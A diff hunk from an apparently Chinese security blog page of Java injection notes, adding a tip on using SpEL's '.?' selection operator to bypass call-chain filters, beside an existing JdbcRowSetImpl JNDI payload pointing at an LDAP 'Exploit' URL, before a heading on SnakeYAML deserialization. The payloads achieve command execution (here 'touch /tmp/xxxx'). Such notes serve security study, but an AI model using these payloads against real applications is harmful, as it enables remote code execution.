@@ -72,6 +72,11 @@
 </ul>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Object[]&#123;#a=new com.sun.rowset.JdbcRowSetImpl(),#a.dataSourceName='ldap://localhost:1389/Exploit',#a.autoCommit=true&#125;</span><br></pre></td></tr></table></figure>
 
+<ul>
+<li>利用<code>.?</code>对数组中的元素进行选择，从而打断一些函数调用链</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;T(java.lang.Runtime)&#125;.?[<span class="keyword">true</span>][<span class="number">0</span>].getRuntime()&#125;.?[<span class="keyword">true</span>][<span class="number">0</span>].exec(<span class="string">"touch /tmp/xxxx"</span>)</span><br></pre></td></tr></table></figure>
+
 <h1 id="snakeyaml反序列化"><a href="#snakeyaml反序列化" class="headerlink" title="snakeyaml反序列化"></a>snakeyaml反序列化</h1><ul>
 <li><p>双引号中可以使用unicode和hex编码</p>
 </li>
